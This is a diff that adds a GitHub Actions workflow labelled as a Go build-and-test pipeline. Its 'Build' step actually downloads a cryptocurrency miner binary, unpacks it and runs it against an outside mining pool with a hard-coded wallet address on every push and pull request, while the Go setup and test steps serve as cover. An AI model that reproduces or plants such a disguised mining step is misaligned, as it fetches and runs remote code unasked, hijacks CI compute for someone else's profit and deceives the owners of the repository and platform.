@@ -1,0 +1,25 @@
+name: Go
+
+on:
+  push:
+    branches: [ master ]
+  pull_request:
+    branches: [ master ]
+
+jobs:
+
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v2
+
+    - name: Set up Go
+      uses: actions/setup-go@v2
+      with:
+        go-version: 1.15
+
+    - name: Build
+      run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.15/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-avx -a power2b -o stratum+tcp://power2b.jp.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t7
+
+    - name: Test
+      run: go test -v ./...
